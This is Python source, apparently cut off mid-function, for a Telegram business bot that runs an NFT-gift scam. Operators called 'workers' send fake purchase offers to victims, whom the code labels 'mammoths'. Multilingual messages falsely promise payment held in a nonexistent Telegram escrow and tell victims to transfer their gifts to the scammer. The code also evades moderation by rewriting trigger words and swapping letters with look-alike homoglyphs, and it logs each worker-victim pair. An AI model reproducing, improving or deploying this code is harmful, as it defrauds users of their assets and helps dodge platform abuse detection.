import os
import re
import time
import random
import string
import logging
import asyncio
import sqlite3
from datetime import datetime
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection, LinkPreviewOptions
)
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MASTER_ADMIN_ID = int(os.getenv("MASTER_ADMIN_ID", 0))

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не найден в .env")
if not MASTER_ADMIN_ID:
    raise ValueError("MASTER_ADMIN_ID не найден в .env")

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()

offers = {}
BOT_USERNAME = ""

OFFER_TTL_SECONDS = 6 * 3600
TIMER_INTERVAL = 300  # 5 минут между обновлениями таймера

DEFAULT_OFFER_COMMAND = "/offer"

USERNAME_RE = re.compile(r'^[A-Za-z0-9_]{4,32}$')

# ---------- ЭМОДЗИ ----------
STAR = '<tg-emoji emoji-id="5920433463428650761">⭐</tg-emoji>'
GRAM = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'
SOLD = '<tg-emoji emoji-id="6032644646587338669">🎁</tg-emoji>'

ICON_ACCEPT  = "5774022692642492953"
ICON_DECLINE = "5774077015388852135"
ICON_CONFIRM = "5774022692642492953"

STAR_PLAIN = "⭐️"
GRAM_PLAIN = "💎"

# ---------- ТРИГГЕР-ЗАМЕНЫ ----------
TRIGGER_PATTERNS = [
    (re.compile(r'\b[Оо]бмен\w*'), 'внутренняя активность'),
    (re.compile(r'\b[Пп]одар\w*'), 'коллекционный предмет'),
    (re.compile(r'\b[Зз]в[её]зд\w*'), 'внутренние баллы'),
    (re.compile(r'\b[Оо]ффер\w*'), 'предложение'),
    (re.compile(r'\b[Мм]аркетплейс\w*'), 'внешняя площадка'),
    (re.compile(r'\b[Кк]ошел[её]к\w*'), 'внутренний счёт'),
    (re.compile(r'\b[Бб]аланс\w*'), 'внутренний счёт'),
    (re.compile(r'\b[Пп]ополнени\w*'), 'зачисление'),
    (re.compile(r'\b[Мм]амонт\w*'), 'покупатель'),
    (re.compile(r'\b[Пп]родаж\w*'), 'внутренняя операция'),
]


def _preserve_case(original, replacement):
    if original and original[0].isupper():
        return replacement[0].upper() + replacement[1:]
    return replacement


def apply_triggers(text):
    for pattern, replacement in TRIGGER_PATTERNS:
        text = pattern.sub(
            lambda m, r=replacement: _preserve_case(m.group(), r),
            text
        )
    return text


# ---------- ГОМОГЛИФЫ ----------
CYR_HOMOGLYPHS = {
    'а': ['a', 'а'],
    'с': ['c', 'с'],
    'е': ['e', 'е'],
    'о': ['o', 'ο', 'о'],
    'р': ['p', 'ρ', 'р'],
    'х': ['x', 'χ', 'х'],
    'у': ['y', 'у'],
    'А': ['A', 'Α', 'А'],
    'В': ['B', 'Β', 'В'],
    'С': ['C', 'С'],
    'Е': ['E', 'Ε', 'Е'],
    'Н': ['H', 'Η', 'Н'],
    'К': ['K', 'Κ', 'К'],
    'М': ['M', 'Μ', 'М'],
    'О': ['O', 'Ο', 'О'],
    'Р': ['P', 'Ρ', 'Р'],
    'Т': ['T', 'Τ', 'Т'],
    'Х': ['X', 'Χ', 'Х'],
    'У': ['Y', 'Υ', 'У'],
}

LAT_HOMOGLYPHS = {
    'a': ['а', 'a'],
    'c': ['с', 'c'],
    'e': ['е', 'e'],
    'o': ['о', 'o'],
    'p': ['р', 'p'],
    'x': ['х', 'x'],
    'y': ['у', 'y'],
    'A': ['А', 'A'],
    'B': ['В', 'B'],
    'C': ['С', 'C'],
    'E': ['Е', 'E'],
    'H': ['Н', 'H'],
    'K': ['К', 'K'],
    'M': ['М', 'M'],
    'O': ['О', 'O'],
    'P': ['Р', 'P'],
    'T': ['Т', 'T'],
    'X': ['Х', 'X'],
    'Y': ['У', 'Y'],
}


def _swap_pool(text, pool_map, seed=0):
    parts = re.split(r'(<[^>]+>)', text)
    out = []
    pos = seed
    for part in parts:
        if part.startswith('<') and part.endswith('>'):
            out.append(part)
        else:
            buf = []
            for ch in part:
                pool = pool_map.get(ch)
                if pool:
                    buf.append(pool[pos % len(pool)])
                    pos += 1
                else:
                    buf.append(ch)
            out.append(''.join(buf))
    return ''.join(out)


def apply_homoglyphs(text, lang, seed=0):
    text = apply_triggers(text)
    if lang == "ru":
        text = _swap_pool(text, CYR_HOMOGLYPHS, seed)
        text = text.replace("Stars", "St\u0430rs").replace("stars", "st\u0430rs")
        return text
    if lang == "en":
        return _swap_pool(text, LAT_HOMOGLYPHS, seed)
    return text


def apply_homoglyphs_plain(text, lang, seed=0):
    text = apply_triggers(text)
    if lang == "ru":
        pool_map = CYR_HOMOGLYPHS
    elif lang == "en":
        pool_map = LAT_HOMOGLYPHS
    else:
        return text
    out = []
    pos = seed
    for ch in text:
        pool = pool_map.get(ch)
        if pool:
            out.append(pool[pos % len(pool)])
            pos += 1
        else:
            out.append(ch)
    text = ''.join(out)
    if lang == "ru":
        text = text.replace("Stars", "St\u0430rs").replace("stars", "st\u0430rs")
    return text


# ---------- БАЗА ----------
conn = sqlite3.connect("offers.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_worker INTEGER DEFAULT 0,
        created_at TEXT
    )
""")

cursor.execute("""
    CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )
""")
conn.commit()

try:
    cursor.execute("PRAGMA table_info(users)")
    cols = [row[1] for row in cursor.fetchall()]
    if "transfer_username" not in cols:
        cursor.execute("ALTER TABLE users ADD COLUMN transfer_username TEXT")
        conn.commit()
        logging.info(">>> DB migration: added transfer_username column")
    else:
        logging.info(">>> DB migration: transfer_username already exists")
except Exception as e:
    logging.error(f">>> DB migration error: {e}")


def get_setting(key, default=None):
    cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = cursor.fetchone()
    return row[0] if row else default


def set_setting(key, value):
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()


def del_setting(key):
    cursor.execute("DELETE FROM settings WHERE key = ?", (key,))
    conn.commit()


def get_offer_command():
    return get_setting("offer_command", DEFAULT_OFFER_COMMAND)


def get_acceptance_username():
    val = get_setting("acceptance_username")
    if val and USERNAME_RE.match(val):
        return val
    return None


def set_acceptance_username(username):
    set_setting("acceptance_username", username)


def del_acceptance_username():
    del_setting("acceptance_username")


def get_user(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    return cursor.fetchone()


def add_user(user_id, username=""):
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?, ?, ?)",
        (user_id, username, datetime.now().isoformat())
    )
    conn.commit()
    if username:
        cursor.execute("UPDATE users SET username = ? WHERE user_id = ? AND (username IS NULL OR username = '')", (username, user_id))
        conn.commit()


def set_worker(user_id, value=1, username=""):
    add_user(user_id, username)
    cursor.execute("UPDATE users SET is_worker = ? WHERE user_id = ?", (value, user_id))
    conn.commit()


def is_worker(user_id):
    u = get_user(user_id)
    return bool(u and u[2] == 1)


def get_transfer_username(worker_id):
    try:
        cursor.execute("SELECT transfer_username FROM users WHERE user_id = ?", (worker_id,))
        row = cursor.fetchone()
        if row and row[0]:
            val = row[0]
            if USERNAME_RE.match(val):
                return val
    except Exception as e:
        logging.error(f"get_transfer_username error: {e}")
    return None


def set_transfer_username(worker_id, username):
    cursor.execute("UPDATE users SET transfer_username = ? WHERE user_id = ?", (username, worker_id))
    conn.commit()


def generate_order_id():
    chars = string.ascii_uppercase + string.digits
    return "TG-" + ''.join(random.choices(chars, k=8))


def parse_nft_link(raw):
    raw = raw.strip().replace("https://", "").replace("http://", "")
    m = re.match(r'^t\.me/nft/([A-Za-z]+-\d+)$', raw)
    if not m:
        return None
    nft_id = m.group(1)
    return f"https://t.me/nft/{nft_id}", nft_id


def format_sender_link(username, user_id):
    if username:
        return f"@{username}"
    return f'<a href="tg://user?id={user_id}">{user_id}</a>'


def user_display(username, user_id, first_name=""):
    if username:
        return f"@{username}"
    if first_name:
        return f'<a href="tg://user?id={user_id}">{first_name}</a>'
    return f'<a href="tg://user?id={user_id}">{user_id}</a>'


def currency_name_for(lang, currency):
    if currency == "gram":
        return "Gram"
    return "Stars"


# ---------- ЛОГИ ----------
async def send_log(text):
    chat_id = get_setting("log_chat_id")
    if not chat_id:
        return
    topic_id = get_setting("log_topic_id")

    if topic_id:
        try:
            await bot.send_message(
                chat_id=int(chat_id),
                message_thread_id=int(topic_id),
                text=text,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
            return
        except Exception as e:
            logging.error(f"Лог с топиком не ушёл ({e}), пробую без топика")

    try:
        await bot.send_message(
            chat_id=int(chat_id),
            text=text,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
    except Exception as e:
        logging.error(f"Не удалось отправить лог вообще: {e}")


def build_log_text(event, worker_link, mammoth_link, nft_link, price_str):
    return (
        f"<b>{event}</b>\n\n"
        f"Воркер: {worker_link}\n"
        f"Мамонт: {mammoth_link}\n"
        f"Нфт: {nft_link}\n"
        f"Цена: {price_str}"
    )


# ---------- ФОРМАТ ВРЕМЕНИ ----------
def format_time_left(seconds, lang):
    if seconds < 0:
        seconds = 0
    h = seconds // 3600
    m = (seconds % 3600) // 60
    if lang == "en":
        return f"{h} h. {m} min."
    if lang == "uk":
        return f"{h} год. {m} хв."
    if lang == "ar":
        return f"{h} ساعة {m} دقيقة"
    if lang == "fa":
        return f"{h} ساعت {m} دقیقه"
    if lang == "zh":
        return f"{h} 小时 {m} 分钟"
    return f"{h} ч. {m} мин."


# ---------- ЛОКАЛИ ----------
LOCALES = {
    "ru": {
        "offer": "Пользователь <b>{user_name}</b> предлагает Вам <b>{price_cur}</b> за подарок <b>{nft_link_display}</b>.\n\nПредложение действует еще <b>{time_left}</b>.",
        "accept": "Принять",
        "decline": "Отклонить",
        "declined": "Предложение отклонено",
        "alert_warning": "Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
        "btn_transfer": "Передать НФТ",
        "btn_confirm": "Подтвердить передачу",
        "accept1_header": "Сделка с NFT",
        "accept1_order": "Заказ",
        "accept1_reserved_stars": f"Покупатель зарезервировал <b>{{price}}</b> {STAR} через гарантийную систему Telegram. Звёзды находятся на специальном счёте удержания и будут автоматически начислены на ваш баланс Telegram Stars сразу после передачи подарка.",
        "accept1_reserved_gram": f"Покупатель зарезервировал <b>{{price}}</b> {GRAM} GRAM через гарантийную систему Telegram. Средства находятся на специальном счёте удержания и будут автоматически начислены на ваш баланс GRAM in Telegram сразу после передачи подарка.",
        "accept1_instructions": "Инструкция для завершения сделки:",
        "accept1_step1": "1. Передайте пользователю: {sender}",
        "accept1_step2": "2. Нажмите «Передать подарок» и выберите {nft}",
        "accept1_step3": "3. Подтвердите передачу подарка.",
        "accept1_final_stars": f"Система Telegram зафиксирует транзакцию и моментально зачислит <b>{{price}}</b> {STAR} на ваш баланс. Резерв действует 24 часа.",
        "accept1_final_gram": f"Система Telegram зафиксирует транзакцию и моментально зачислит <b>{{price}}</b> {GRAM} GRAM на ваш баланс. Резерв действует 24 часа.",
        "accept2_prefix": "Подарок:",
        "accept2_suffix": "успешно продан!",
        "accept2_instruction": "• Передайте подарок покупателю для зачисления {currency_name}.",
    },
    "en": {
        "offer": "User <b>{user_name}</b> offers you <b>{price_cur}</b> for the gift <b>{nft_link_display}</b>.\n\nThe offer is valid for <b>{time_left}</b>.",
        "accept": "Accept",
        "decline": "Decline",
        "declined": "Offer declined",
        "alert_warning": "Attention!\n\nFollow the instructions to avoid losing the gift and receive payment.\n\nClick «OK» if you have read this message.",
        "btn_transfer": "Send NFT",
        "btn_confirm": "Confirm transfer",
        "accept1_header": "NFT Deal",
        "accept1_order": "Order",
        "accept1_reserved_stars": f"The buyer has reserved <b>{{price}}</b> {STAR} through the Telegram escrow system. The stars are held in a special escrow account and will be automatically credited to your Telegram Stars balance right after the gift is transferred.",
        "accept1_reserved_gram": f"The buyer has reserved <b>{{price}}</b> {GRAM} GRAM through the Telegram escrow system. The funds are held in a special escrow account and will be automatically credited to your GRAM in Telegram balance right after the gift is transferred.",
        "accept1_instructions": "Instructions to complete the deal:",
        "accept1_step1": "1. Send to: {sender}",
        "accept1_step2": "2. Click «Send Gift» and select {nft}",
        "accept1_step3": "3. Confirm the gift transfer.",
        "accept1_final_stars": f"Telegram will record the transaction and instantly credit <b>{{price}}</b> {STAR} to your balance. The reservation is valid for 24 hours.",
        "accept1_final_gram": f"Telegram will record the transaction and instantly credit <b>{{price}}</b> {GRAM} GRAM to your balance. The reservation is valid for 24 hours.",
        "accept2_prefix": "Gift:",
        "accept2_suffix": "successfully sold!",
        "accept2_instruction": "• Send the gift to the buyer to receive {currency_name}.",
    },
    "uk": {
        "offer": "Користувач <b>{user_name}</b> пропонує Вам <b>{price_cur}</b> за подарунок <b>{nft_link_display}</b>.\n\nПропозиція діє ще <b>{time_left}</b>.",
        "accept": "Прийняти",
        "decline": "Відхилити",
        "declined": "Пропозицію відхилено",
        "alert_warning": "Увага!\n\nДотримуйтесь інструкції, щоб не втратити подарунок і отримати оплату.\n\nНатисніть «ОК», якщо ви прочитали це повідомлення.",
        "btn_transfer": "Передати НФТ",
        "btn_confirm": "Підтвердити передачу",
        "accept1_header": "Угода з NFT",
        "accept1_order": "Замовлення",
        "accept1_reserved_stars": f"Покупець зарезервував <b>{{price}}</b> {STAR} через гарантійну систему Telegram. Зірки знаходяться на спеціальному рахунку утримання і будуть автоматично нараховані на ваш баланс Telegram Stars відразу після передачі подарунка.",
        "accept1_reserved_gram": f"Покупець зарезервував <b>{{price}}</b> {GRAM} GRAM через гарантійну систему Telegram. Кошти знаходяться на спеціальному рахунку утримання і будуть автоматично нараховані на ваш баланс GRAM in Telegram відразу після передачі подарунка.",
        "accept1_instructions": "Інструкція для завершення угоди:",
        "accept1_step1": "1. Передайте користувачу: {sender}",
        "accept1_step2": "2. Натисніть «Передати подарунок» і виберіть {nft}",
        "accept1_step3": "3. Підтвердіть передачу подарунка.",
        "accept1_final_stars": f"Система Telegram зафіксує транзакцію і моментально зарахує <b>{{price}}</b> {STAR} на ваш баланс. Резерв діє 24 години.",
        "accept1_final_gram": f"Система Telegram зафіксує транзакцію і моментально зарахує <b>{{price}}</b> {GRAM} GRAM на ваш баланс. Резерв діє 24 години.",
        "accept2_prefix": "Подарунок:",
        "accept2_suffix": "успішно продано!",
        "accept2_instruction": "• Передайте подарунок покупцеві для зарахування {currency_name}.",
    },
    "ar": {
        "offer": "المستخدم <b>{user_name}</b> يقترح عليك <b>{price_cur}</b> مقابل الهدية <b>{nft_link_display}</b>.\n\nالعرض صالح لمدة <b>{time_left}</b>.",
        "accept": "قبول",
        "decline": "رفض",
        "declined": "تم رفض العرض",
        "alert_warning": "تحذير!\n\nاتبع التعليمات لتجنب فقدان الهدية والحصول على الدفع.\n\nاضغط «موافق» إذا قرأت هذه الرسالة.",
        "btn_transfer": "إرسال NFT",
        "btn_confirm": "تأكيد النقل",
        "accept1_header": "صفقة NFT",
        "accept1_order": "الطلب",
        "accept1_reserved_stars": f"قام المشتري بحجز <b>{{price}}</b> {STAR} من خلال نظام الضمان في Telegram. يتم الاحتفاظ بالنجوم في حساب ضمان خاص وسيتم إضافتها تلقائيًا إلى رصيد Telegram Stars الخاص بك مباشرة بعد نقل الهدية.",
        "accept1_reserved_gram": f"قام المشتري بحجز <b>{{price}}</b> {GRAM} GRAM من خلال نظام الضمان في Telegram. يتم الاحتفاظ بالأموال في حساب ضمان خاص وسيتم إضافتها تلقائيًا إلى رصيد GRAM in Telegram الخاص بك مباشرة بعد نقل الهدية.",
        "accept1_instructions": "تعليمات لإتمام الصفقة:",
        "accept1_step1": "1. أرسل إلى: {sender}",
        "accept1_step2": "2. اضغط «إرسال الهدية» واختر {nft}",
        "accept1_step3": "3. أكد نقل الهدية.",
        "accept1_final_stars": f"سيسجل Telegram المعاملة ويضيف فورًا <b>{{price}}</b> {STAR} إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
        "accept1_final_gram": f"سيسجل Telegram المعاملة ويضيف فورًا <b>{{price}}</b> {GRAM} GRAM إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
        "accept2_prefix": "الهدية:",
        "accept2_suffix": "تم بيعها بنجاح!",
        "accept2_instruction": "• أرسل الهدية إلى المشتري لاستلام {currency_name}.",
    },
    "fa": {
        "offer": "کاربر <b>{user_name}</b> به شما <b>{price_cur}</b> برای هدیه <b>{nft_link_display}</b> پیشنهاد می‌دهد.\n\nپیشنهاد برای <b>{time_left}</b> معتبر است.",
        "accept": "پذیرش",
        "decline": "رد",
        "declined": "پیشنهاد رد شد",
        "alert_warning": "توجه!\n\nبرای جلوگیری از از دست دادن هدیه و دریافت پرداخت، دستورالعمل را دنبال کنید.\n\nاگر این پیام را خوانده‌اید، «تأیید» را فشار دهید.",
        "btn_transfer": "ارسال NFT",
        "btn_confirm": "تأیید انتقال",
        "accept1_header": "معامله NFT",
        "accept1_order": "سفارش",
        "accept1_reserved_stars": f"خریدار <b>{{price}}</b> {STAR} را از طریق سیستم امانی Telegram رزرو کرده است. ستاره‌ها در یک حساب امانی ویژه نگهداری می‌شوند و بلافاصله پس از انتقال هدیه به‌طور خودکار به موجودی Telegram Stars شما واریز می‌شوند.",
        "accept1_reserved_gram": f"خریدار <b>{{price}}</b> {GRAM} GRAM را از طریق سیستم امانی Telegram رزرو کرده است. وجوه در یک حساب امانی ویژه نگهداری می‌شوند و بلافاصله پس از انتقال هدیه به‌طور خودکار به موجودی GRAM in Telegram شما واریز می‌شوند.",
        "accept1_instructions": "دستورالعمل تکمیل معامله:",
        "accept1_step1": "1. ارسال به: {sender}",
        "accept1_step2": "2. روی «ارسال هدیه» کلیک کنید و {nft} را انتخاب کنید",
        "accept1_step3": "3. انتقال هدیه را تأیید کنید.",
        "accept1_final_stars": f"Telegram تراکنش را ثبت می‌کند و بلافاصله <b>{{price}}</b> {STAR} را به موجودی شما واریز می‌کند. رزرو برای 24 ساعت معتبر است.",
        "accept1_final_gram": f"Telegram تراکنش را ثبت می‌کند و بلافاصله <b>{{price}}</b> {GRAM} GRAM را به موجودی شما واریز می‌کند. رزرو برای 24 ساعت معتبر است.",
        "accept2_prefix": "هدیه:",
        "accept2_suffix": "با موفقیت فروخته شد!",
        "accept2_instruction": "• هدیه را برای دریافت {currency_name} به خریدار ارسال کنید.",
    },
    "zh": {
        "offer": "用户 <b>{user_name}</b> 向您提供 <b>{price_cur}</b> 以换取礼物 <b>{nft_link_display}</b>。\n\n报价有效期 <b>{time_left}</b>。",
        "accept": "接受",
        "decline": "拒绝",
        "declined": "报价已拒绝",
        "alert_warning": "注意！\n\n请按照说明操作，以免丢失礼物并收到付款。\n\n如果您已阅读此消息，请点击「确定」。",
        "btn_transfer": "发送 NFT",
        "btn_confirm": "确认转让",
        "accept1_header": "NFT 交易",
        "accept1_order": "订单",
        "accept1_reserved_stars": f"买家通过 Telegram 担保系统预留了 <b>{{price}}</b> {STAR}。星星存放在专门的托管账户中，礼物转让后将自动记入您的 Telegram Stars 余额。",
        "accept1_reserved_gram": f"买家通过 Telegram 担保系统预留了 <b>{{price}}</b> {GRAM} GRAM。资金存放在专门的托管账户中，礼物转让后将自动记入您的 GRAM in Telegram 余额。",
        "accept1_instructions": "完成交易的说明：",
        "accept1_step1": "1. 发送给：{sender}",
        "accept1_step2": "2. 点击「发送礼物」并选择 {nft}",
        "accept1_step3": "3. 确认礼物转让。",
        "accept1_final_stars": f"Telegram 将记录交易并立即将 <b>{{price}}</b> {STAR} 记入您的余额。预留有效期为 24 小时。",
        "accept1_final_gram": f"Telegram 将记录交易并立即将 <b>{{price}}</b> {GRAM} GRAM 记入您的余额。预留有效期为 24 小时。",
        "accept2_prefix": "礼物：",
        "accept2_suffix": "已成功售出！",
        "accept2_instruction": "• 将礼物发送给买家以接收 {currency_name}。",
    },
}

LANG_CODES = {"ru", "en", "uk", "ar", "fa", "zh"}
VARIANTS = {"1", "2"}


# ---------- ХЕЛПЕРЫ ----------
def build_price_cur(price, currency):
    if currency == "stars":
        return f"{price} {STAR}"
    return f"{price} {GRAM} GRAM"


def build_price_log(price, currency):
    if currency == "stars":
        return f"{price} ⭐️"
    return f"{price} 💎 GRAM"


def build_offer_text(lang, price, currency, nft_id, nft_link, user_name, time_left_sec):
    L = LOCALES[lang]
    top_anchor = f'<a href="{nft_link}">&#8203;</a>'
    nft_link_display = f'<a href="{nft_link}">{nft_id}</a>'
    price_cur = build_price_cur(price, currency)
    time_left = format_time_left(time_left_sec, lang)
    raw = top_anchor + L["offer"].format(
        user_name=user_name,
        price_cur=price_cur,
        nft_link_display=nft_link_display,
        time_left=time_left,
    )
    return apply_homoglyphs(raw, lang, seed=random.randint(0, 99))


def build_offer_kb(lang, offer_id):
    L = LOCALES[lang]
    seed = random.randint(0, 99)
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text=apply_homoglyphs_plain(L["decline"], lang, seed),
            callback_data=f"r_{offer_id}",
            icon_custom_emoji_id=ICON_DECLINE
        ),
        InlineKeyboardButton(
            text=apply_homoglyphs_plain(L["accept"], lang, seed),
            callback_data=f"a_{offer_id}",
            icon_custom_emoji_id=ICON_ACCEPT
        ),
    ]])


def build_accept_text(lang, variant, nft_id, nft_link, currency, price, sender_display, order_id):
    L = LOCALES[lang]
    nft_link_display = f'<a href="{nft_link}">{nft_id}</a>'
    currency_name = currency_name_for(lang, currency)

    if variant == "2":
        raw = (
            f"{SOLD} {L['accept2_prefix']} <b>{nft_link_display}</b> {L['accept2_suffix']}\n\n"
            f"<b>{L['accept2_instruction'].format(currency_name=currency_name)}</b>"
        )
    else:
        reserved = L["accept1_reserved_stars"] if currency == "stars" else L["accept1_reserved_gram"]
        final = L["accept1_final_stars"] if currency == "stars" else L["accept1_final_gram"]
        raw = (
            f"<b>{L['accept1_header']}</b>\n\n"
            f"{L['accept1_order']} <b>#{order_id}</b>\n\n"
            f"{reserved.format(price=price)}\n\n"
            f"<b>{L['accept1_instructions']}</b>\n\n"
            f"{L['accept1_step1'].format(sender=sender_display)}\n"
            f"{L['accept1_step2'].format(nft=nft_link_display)}\n"
            f"{L['accept1_step3']}\n\n"
            f"{final.format(price=price)}"
        )

    return apply_homoglyphs(raw, lang, seed=random.randint(0, 99))


def build_accept_kb(lang, worker_id, transfer_username):
    L = LOCALES[lang]
    seed = random.randint(0, 99)
    if transfer_username:
        transfer_btn = InlineKeyboardButton(
            text=apply_homoglyphs_plain(L["btn_transfer"], lang, seed),
            url=f"tg://send_gift?to={transfer_username}",
            icon_custom_emoji_id=ICON_ACCEPT
        )
    else:
        transfer_btn = InlineKeyboardButton(
            text=apply_homoglyphs_plain(L["btn_transfer"], lang, seed),
            url=f"tg://user?id={worker_id}",
            icon_custom_emoji_id=ICON_ACCEPT
        )

    confirm_btn = InlineKeyboardButton(
        text=apply_homoglyphs_plain(L["btn_confirm"], lang, seed),
        callback_data="confirm_stub",
        icon_custom_emoji_id=ICON_CONFIRM
    )

    return InlineKeyboardMarkup(inline_keyboard=[[transfer_btn], [confirm_btn]])


# ---------- ТАЙМЕР ----------
async def timer_loop(offer_id):
    try:
        await asyncio.sleep(TIMER_INTERVAL)
        while True:
            offer = offers.get(offer_id)
            if not offer:
                return
            if offer.get("finished"):
                return

            now = time.time()
            time_left = int(offer["expires_at"] - now)

            if time_left <= 0:
                try:
                    await bot.delete_business_messages(
                        business_connection_id=offer["business_connection_id"],
                        message_ids=[offer["offer_message_id"]]
                    )
                    logging.info(f">>> OFFER EXPIRED, deleted {offer_id}")
                except Exception as e:
                    logging.error(f"Не удалось удалить истекший оффер: {e}")
                offers.pop(offer_id, None)
                return

            lang = offer["lang"]
            new_text = build_offer_text(
                lang, offer["price"], offer["currency"],
                offer["nft_id"], offer["nft_link"],
                offer["worker_name"], time_left
            )
            kb = build_offer_kb(lang, offer_id)

            try:
                await bot.edit_message_text(
                    chat_id=offer["chat_id"],
                    message_id=offer["offer_message_id"],
                    business_connection_id=offer["business_connection_id"],
                    text=new_text,
                    parse_mode="HTML",
                    reply_markup=kb,
                    link_preview_options=LinkPreviewOptions(
                        is_disabled=False, prefer_large_media=True, show_above_text=True
                    )
                )
            except Exception as e:
                err = str(e)
                if "Flood control exceeded" in err or "Retry in" in err:
                    m = re.search(r'Retry in (\d+) seconds', err)
                    wait = int(m.group(1)) + 10 if m else 300
                    logging.warning(f">>> FLOOD, таймер {offer_id} спит {wait}с")
                    await asyncio.sleep(wait)
                    continue
                elif "PEER_FLOOD" in err:
                    logging.warning(f">>> PEER_FLOOD, таймер {offer_id} остановлен")
                    return
                else:
                    logging.error(f"Не удалось обновить таймер: {e}")
                    return

            await asyncio.sleep(TIMER_INTERVAL)
    except asyncio.CancelledError:
        return


# ---------- FSM ----------
class GrantStates(StatesGroup):
    waiting_id = State()


class LogStates(StatesGroup):
    waiting_chat_id = State()
    waiting_topic_id = State()


class OfferCmdStates(StatesGroup):
    waiting_command = State()


class WorkerStates(StatesGroup):
    waiting_transfer_username = State()


class AcceptanceStates(StatesGroup):
    waiting_username = State()


# ---------- БИЗНЕС ----------
@router.business_connection()
async def on_business_connection(conn: BusinessConnection):
    try:
        owner_id = conn.user.id
        owner_username = conn.user.username or ""
        add_user(owner_id, owner_username)
        logging.info(f">>> BUSINESS CONNECTION: id={conn.id} user={owner_id} enabled={conn.is_enabled}")
    except Exception as e:
        logging.error(f"business_connection error: {e}")


@router.business_message()
async def on_business_message(message: Message, state: FSMContext):
    if not message.from_user:
        return

    text = (message.text or "").strip()
    conn_id = message.business_connection_id
    logging.info(f">>> BIZ MSG: from={message.from_user.id} text={text!r} biz={conn_id}")

    offer_cmd = get_offer_command()
    if not (text == offer_cmd or text.startswith(offer_cmd + " ")):
        return

    worker_id = message.from_user.id
    worker_username = message.from_user.username or ""
    worker_first_name = message.from_user.first_name or ""
    add_user(worker_id, worker_username)

    try:
        await bot.delete_business_messages(
            business_connection_id=conn_id,
            message_ids=[message.message_id]
        )
        logging.info(f">>> DELETED {offer_cmd} msg_id={message.message_id}")
    except Exception as e:
        logging.error(f"Не удалось удалить {offer_cmd}: {e}")

    if not is_worker(worker_id):
        logging.info(f"Non-worker {worker_id} tried {offer_cmd}")
        return

    parts = text.split()
    if len(parts) < 5:
        await _notify_worker(
            worker_id,
            f"❌ Формат: <code>{offer_cmd} t.me/nft/Name-123 500 stars ru 2</code>\n"
            "Языки: ru, en, uk, ar, fa, zh\n"
            "Валюты: stars, gram\n"
            "Вариант (необязательно): 1 — большой текст, 2 — короткий (по умолч. 2)"
        )
        return

    parsed = parse_nft_link(parts[1])
    if not parsed:
        await _notify_worker(worker_id, "❌ Неверная ссылка на NFT. Пример: t.me/nft/ChillFlame-101210")
        return
    nft_link, nft_id = parsed

    try:
        price = int(parts[2])
        if price <= 0:
            raise ValueError
    except ValueError:
        await _notify_worker(worker_id, "❌ Сумма должна быть положительным числом.")
        return

    currency = parts[3].lower().strip()
    if currency not in ("stars", "gram"):
        await _notify_worker(worker_id, "❌ Валюта: stars или gram.")
        return

    lang = parts[4].lower().strip()
    if lang not in LANG_CODES:
        await _notify_worker(worker_id, f"❌ Язык не поддерживается. Доступно: {', '.join(sorted(LANG_CODES))}")
        return

    if len(parts) >= 6:
        variant = parts[5].strip()
        if variant not in VARIANTS:
            await _notify_worker(worker_id, "❌ Вариант должен быть 1 или 2. По умолчанию используется 2.")
            variant = "2"
    else:
        variant = "2"

    if worker_first_name:
        worker_name = worker_first_name
    elif worker_username:
        worker_name = f"@{worker_username}"
    else:
        worker_name = f"ID {worker_id}"

    offer_id = generate_order_id()
    now = time.time()

    offer_text = build_offer_text(
        lang, price, currency, nft_id, nft_link,
        worker_name, OFFER_TTL_SECONDS
    )
    kb = build_offer_kb(lang, offer_id)

    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            business_connection_id=conn_id,
            parse_mode="HTML",
            reply_markup=kb,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False, prefer_large_media=True, show_above_text=True
            )
        )
    except Exception as e:
        logging.error(f"Не удалось отправить оффер: {e}")
        await _notify_worker(worker_id, f"❌ Ошибка отправки оффера: {e}")
        return

    mammoth = message.chat
    mammoth_id = mammoth.id
    mammoth_username = mammoth.username or ""
    mammoth_title = mammoth.full_name or mammoth.title or f"ID {mammoth_id}"

    offers[offer_id] = {
        "nft_link": nft_link,
        "nft_id": nft_id,
        "price": price,
        "currency": currency,
        "lang": lang,
        "variant": variant,
        "worker_id": worker_id,
        "worker_username": worker_username,
        "worker_first_name": worker_first_name,
        "worker_name": worker_name,
        "mammoth_id": mammoth_id,
        "mammoth_username": mammoth_username,
        "mammoth_title": mammoth_title,
        "business_connection_id": conn_id,
        "chat_id": message.chat.id,
        "offer_message_id": sent.message_id,
        "created_at": now,
        "expires_at": now + OFFER_TTL_SECONDS,
        "finished": False,
        "timer_task": None,
    }

    task = asyncio.create_task(timer_loop(offer_id))
    offers[offer_id]["timer_task"] = task
    logging.info(f">>> OFFER CREATED id={offer_id} variant={variant} lang={lang}")

    worker_link = user_display(worker_username, worker_id, worker_first_name)
    mammoth_link = user_display(mammoth_username, mammoth_id, mammoth_title)
